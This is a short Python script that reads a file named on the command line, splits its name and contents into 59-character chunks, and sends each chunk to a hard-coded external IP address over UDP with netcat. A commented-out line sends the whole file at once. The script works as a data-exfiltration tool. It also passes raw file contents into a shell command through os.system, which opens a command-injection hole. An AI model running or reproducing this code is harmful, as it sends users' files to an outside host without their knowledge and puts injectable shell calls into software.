import os
import sys

filename = sys.argv[1]
data = filename + '|'
with open(filename, 'r') as file:
	data += file.read() + '|'
splitData = []
splitamount = 59
for x in range(0, len(data), splitamount):
	splitData.append(data[x : x + splitamount])

for datasegment in splitData:
	os.system('echo -n "' + datasegment + '" | nc -u 92.70.3.242 4071 -w1')
print(splitData)
print(data)
print(len(data))
#os.system('echo -n "' + data + '" | nc -u 92.70.3.242 4071 -w0')
